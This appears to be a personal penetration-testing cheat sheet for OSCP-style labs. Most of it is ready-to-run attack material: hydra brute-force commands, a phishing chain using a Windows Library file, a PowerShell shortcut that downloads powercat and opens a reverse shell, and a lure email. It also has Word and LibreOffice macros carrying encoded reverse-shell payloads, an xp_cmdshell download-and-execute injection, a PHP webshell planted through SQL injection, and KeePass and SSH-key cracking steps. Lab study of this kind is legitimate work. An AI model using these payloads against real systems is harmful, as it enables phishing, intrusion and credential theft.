
# Reminder
1) Spray default credentials
	1) `admin:admin`, `admin:password`, `root:root`, `root:password`, `root:toor`
	2) Spray name of service or company
	3) Research default creds for the specific service
2) Reverse shell outbound ports to try:
	1) 53, 80, 443, 8080

```bash
--script=vuln # Add this option for NMap to check for vulnerabilities
sudo nmap 192.168.211.242 -sC -sV -oA nmap/initial -p- -vv
sudo nmap 192.168.211.242 -sC -sV -sU -oA nmap/initial --top-ports 100 -vv
sudo nmap -iL targets.txt # read from a targets file
sudo nmap -iL targets.lst -Pn --unprivileged -sC -sV -oA nmap/initial -p- -vv # Scan through Ligolo-ng

sudo autorecon -t TARGET_FILE # press the UP arrow during a scan to view more verbosity
# When autorecon is done, go to the output directory and do the following to browse the results like a website
python3 -m http.server 8081

# SSH brute force
sudo hydra -L users.lst -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt 192.168.222.122 ssh -t 4 -I -vv
# Alternative SSH brute force
sudo hydra -L users.txt -P passwords.txt -e nsr -t 10 -I man-vV ssh://192.168.50.100
# Web brute force HTTP-POST-FORM https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
# Swagger web brute force; this will target the "Authorization" header in the HTTP-GET request
# E.g., `Authorization: Basic YWRtaW46cGFzc3dvcmQ=`
# where "YWRtaW46cGFzc3dvcmQ=' base64 decodes to "admin:password"
sudo hydra -L users.lst -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt git.example.com http-get /api/v1/user
# HTTP Basic Auth
sudo hydra -l admin -p password -s 80 -f site.com http-get

# Short wordlist (different from full wordlist, run both)
sudo gobuster dir -u http://192.168.211.244 -w /usr/share/wordlists/dirb/common.txt

# Full wordlist
sudo gobuster dir -u http://192.168.211.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Gobuster firsts runs a test to ensure a non-existent page will return a 404. If not, you will get an error like "Error: the server returns a status code that matches the provided options for non existing URLs". Exclude that status-code with "-b"
# "-b" (make sure to still include 404)
sudo gobuster dir -u http://192.168.211.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b '404,403'
# Exclude length
sudo gobuster dir -u http://192.168.211.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length <NUMBER>

# "-k" to run against HTTPS websites and ignore cert errors
sudo gobuster dir -u https://192.168.211.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k

# Patator; DISCLAIMER: cannot get working
# before_urls and --extract is how we get CSRF token
docker run -it --rm -v .:/mnt patator http_fuzz \
  url="http://git.example.com/user/login" \
  method=POST \
  body="_csrf=CSRF_TOKEN&username=FILE0&password=FILE1" \
  0=/mnt/users.lst \
  1=/mnt/500-worst-passwords.txt \
  header="Content-Type: application/x-www-form-urlencoded" \
  before_urls="http://git.example.com/user/login" \
  before_egrep="CSRF_TOKEN='name=\"_csrf\" value=\"(\w+)\"'" \
  -x ignore:fgrep="Username or password is incorrect"


smbmap -u maildmz -p password123 -d boringcomp.com -H 192.168.153.191 -x "whoami"
```

# HTTP Scanning
Gobuster above
Feroxbuster:
```bash
sudo feroxbuster -u https://192.168.106.140:443 -w /usr/share/wordlists/dirb/common.txt -A -k --scan-dir-listings
# -A randomizes user-agent
# -k ignores TLS cert
```

# SSH Brute Force
```bash
hydra -l "issue_user" -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt -vV 192.168.166.147 ssh -t 4 -I
```

# FTP Brute Force
```bash
hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp
# Brute force Anonymous login for a given list of users
hydra -L /path/to/usernames.txt -p anypassword ftp://<target-ip> (-s port)
```
# MySQL Brute Force
```msfconsole
use auxiliary/scanner/mysql/mysql_login
```
# SMTP User Enumeration
```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip

hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
```


1) AutoRecon
	1) Autorecon *may* be weak on SNMP enumeration
		1) Check [[161,162 UDP - SNMP (Windows)]] for details on further enumeration
2) Target:
	2) 80 HTTP
		1) If it is a template `index.html`, run `gobuster`. If still nothing interesting, move on.
		2) `whatweb 192.168.211.244 -a 3 -v`
	3) 22 SSH
		1) Remember to spray creds here
		2) Remember to try list of default creds here
		3) Note the version
	4) 21 FTP
		1) Spray creds
		2) Note the version
		3) Anonymous log in
	5) 445 SMB
		1) Null session attack
		2) Note the version
		3) Consider EternalBlue
		4) Spray creds
	6) 3389 RDP
		1) Spray creds
	7) 53 DNS (UDP/TCP)
		1) Zone transfer
			1) First, identify DNS servers with `host -t ns example.com`
			2) Next, attempt the transfer with one of the following methods: 
				1) `dnsrecon -d example.com -a`
				2) `dig axfr @ns1.example.com example.com`
				3) `host -l example.com ns1.example.com`
		2) Subdomain enumeration

# Client-Side Attacks
https://filesec.io/ - List of all file extensions and how they are used for client-side attacks

Good general resource for HTA, PDF, Microsoft Word Macro attack:
https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/client_side_attacks.md

## Windows Library & Shortcut Files

We have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.

### WebDAV Share Setup
```bash
mkdir /home/kali/beyond/webdav

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```

### Prepare Windows Library and Shortcut Files
Start Windows development box. Open VSCode and create a new text file on the desktop named `config.Library-ms`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.226</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
*Note: you don't need to change anything besides URL above*
Save the file and transfer it to `/home/kali/beyond`

Next we create a shortcut file on the Windows development box. Right-click the Desktop and select `New > Shortcut` and enter:
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.226:8000/powercat.ps1'); powercat -c 192.168.45.226 -p 443 -e powershell"
```

Serve PowerCat via our Python3 server:
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

Create the email `body.txt`:
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

Send the email:
```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
*Note: when running the above command, can simply provide you don't need to provide fully qualified domain username. E.g., if mail@boringcomp.com is the user, you can just provide "mail" as the username*

#### "Host did not advertise authentication" Error
Remove `-ap` from the swaks command. Host may not require authentication at all and does not want it.

## Word Doc Macros

### VBA Macro Code (Example)
```VBA
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```
This is what it should resemble after modifying and chunking the PowerShell payload below
### PowerShell Payload
```PowerShell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.2/powercat.ps1');powercat -c 192.168.45.2 -p 443 -e powershell
```
### Chunking the PowerShell Payload
Because VBA has a 255 character limit for literal strings, but not when they are stored in variables
```Python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
### How to LibreOffice Macro
Use the chunking script above OR **preferably even just use either `rodolfomarianocy/Evil-Macro` or `JohnWoodman/VBA-Macro-Reverse-Shell` tools to generate the chunked payload for you**.

**You do not need `AutoOpen` or `Document_Open` functions in your macro (those are for Microsoft Word). LibreOffice assigns macro events directly in the macro manager, as explained below. 

**ALSO, replace `CreateObject("Wscript.Shell").Run Str` with `Shell(Str)` as shown below.**

Your payload should resemble something like:**
```VBA
REM  *****  BASIC  *****

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgA"
    Str = Str + "D0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0"
    Str = Str + "ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAa"
    Str = Str + "QBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA"
    Str = Str + "zACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkA"
    Str = Str + "GMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADs"
    Str = Str + "AWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAAL"
    Str = Str + "gAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAA"
    Str = Str + "oACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoA"
    Str = Str + "CQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEw"
    Str = Str + "AZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAY"
    Str = Str + "QB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQB"
    Str = Str + "UAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4A"
    Str = Str + "HQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGU"
    Str = Str + "AdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJ"
    Str = Str + "ABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB"
    Str = Str + "4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtA"
    Str = Str + "FMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADI"
    Str = Str + "AIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAI"
    Str = Str + "AAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA"
    Str = Str + "+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0A"
    Str = Str + "GUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEk"
    Str = Str + "ASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAY"
    Str = Str + "QBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQA"
    Str = Str + "oACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiA"
    Str = Str + "HkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0"
    Str = Str + "ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQ"
    Str = Str + "wBsAG8AcwBlACgAKQA="

    Shell(Str)
End Sub
```

Create that macro in `Tools -> Macros -> Edit Macros`

Then follow the steps outlined here to attach your macro to LibreOffice file:
https://routezero.security/2024/11/09/proving-grounds-practice-hepet-walkthrough/

#### Steps
1) Create payload as described above
2) Embed the macro **in the file**
3) Create trigger for macro on document open
4) Save document
5) Send email (`swaks` or `sendemail`)
#### Embed the Macro in the file
For payload delivery (e.g. OSCP-style .ods phishing attack), the macro must be embedded in the spreadsheet file, not just your global LibreOffice macro library.

1) Open your `.ods` file in LibreOffice
2) Go to Tools → Macros → Organize Macros → LibreOffice Basic
3) Select your `.ods` file in the left-hand panel
4) Click **New**, name the module (e.g., Module1)
5) In the module that opens, paste your Sub MyMacro() code
6) Save
#### Macro Event Trigger

1) To ensure the macro runs automatically when the document is opened, we need to assign it to the `Open Document` or `Document Load` events. In LibreOffice, navigate to Tools -> Customize, 
2) Select the `Events` tab, and 
3) Assign the Exploit macro (note: the same one created in [[War Plan Black (Initial Foothold)#Embed the Macro in the file]]) to the Open Document event.
4) Save the document to disk
5) Send the document with Swaks [[War Plan Black (Initial Foothold)#Prepare Windows Library and Shortcut Files]]
	1) Alternative to Swaks, can try `sendemail` below:
```bash
sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s '192.168.217.140:25' -u 'Your spreadsheet' -m 'here is your requested spreadsheet' -a attack.ods
```

# SQL
```MySQL
';EXEC xp_cmdshell 'curl -o C:\Users\Public\rev.exe http://192.168.45.159/rev.exe & C:\Users\Public\rev.exe';--
```
*Important:* `cmd.exe` respects ampersand `&` but not semicolon `;`

```bash
impacket-mssqlclient sql_svc:Dolphin1@10.10.201.148 -port 1433 -windows-auth
```
***NOTE: try without domain and with `-windows-auth`***

### WebShell via SQLi
```SQL
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
```
E.g., https://sudsy-fireplace-912.notion.site/Pebbles-from-Proving-Grounds-without-SQLMap-by-Luis-Moret-lainkusanagi-23b29df77e6946a6bb8cb213a76a9ac8
## PSQL

```bash
psql -h 192.168.193.47 -U root postgres -p 5437
```
- Database name in this example is "postgres"; if you do not provide a database name, psql will assume it is the same as the given username
```SQL
select version();
\du+ %% list database users %%
SELECT pg_user.usename FROM pg_catalog.pg_user; %% Similar to above %%
\l %% show databases %%
\c %% connect to database %%
\dt %% show database tables %%
```

PSQL reverse shell:
https://github.com/squid22/PostgreSQL_RCE/tree/main

# Web
https://www.reddit.com/r/oscp/comments/1j3iujt/wtf_is_sql_injection_sqli_for_the_oscp_and_beyond/

# Cracking
## (KeePass) Password Manager

KeePass database stored as a `.kdbx` file on the system (and there may be more than one!)

Find ALL `.kdbx` files on-disk:
```PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

JtR suite includes various transformation functions:
- `ssh2john`
- `\_keepass2john\_`
- etc...

```bash
keepass2john Database.kdbx > keepass.hash
```

Since KeePass uses a master password without an associated username, we'll remove the `Database:` string from `keepass.hash`

```bash
cat keepass.hash

$keepass$*2*60*0*e74e29a727e9338717d39a7d457ba3486d20dec23a9db1a7fbc7a068c3aec6bd*04b1bfd747898d8dcd4d463ee768e...
```

Begin cracking with hashcat:
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --username
```
**REMEMBER: THIS IS THE PASSWORD TO THE KEEPASS DATABASE**
Launch Keepass `keepassxc Database.kdbx` and enter password

## SSH Private Key

SSH Private Keys may have an associated passphrase. Prepare the key for the crackening:
```bash
ssh2john id_rsa > ssh.hash
```

John to crack hash (because Hashcat does not yet support `aes-256-ctr` cipher which modern private keys and their corresponding passphrases are created with)
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
```
*Note: sshRules is something I made for lab. Either remove or use actual good rules. Rules can be found in /etc/john/john.conf*

### ZIP File Cracking

Try extracting with `7z x`; more robust than `unzip`

```bash
zip2john zip.file > ziphash.john

john --show ziphash.john
```
